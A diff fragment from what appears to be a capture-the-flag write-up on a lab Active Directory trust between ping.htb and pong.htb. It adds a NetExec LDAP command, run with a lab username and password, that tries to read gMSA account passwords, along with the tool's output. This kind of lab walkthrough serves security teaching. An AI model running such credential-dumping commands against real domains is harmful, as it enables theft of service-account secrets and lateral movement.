@@ -497,5 +497,13 @@ I can use nxc to get the details on the trust, this is clearly a two way trust
 
 In order to auth, ill update the `krb5.conf` for both domains
 
+```python
+❯❯❯ faketime -f +8h nxc ldap dc2.pong.htb -u c.roberts -p 'AssumedBreach123' -k -d ping.htb --gmsa
+LDAP        dc2.pong.htb    389    DC2              [*] None (name:DC2) (domain:ping.htb) (signing:None) (channel binding:No TLS cert) (NTLM:False)
+LDAP        dc2.pong.htb    389    DC2              [+] ping.htb\c.roberts:AssumedBreach123 
+LDAP        dc2.pong.htb    389    DC2              [*] Getting GMSA Passwords
+LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$           NTLM: <no read permissions>                PrincipalsAllowedToReadPassword: gMSA Managers
+```
+
 
 
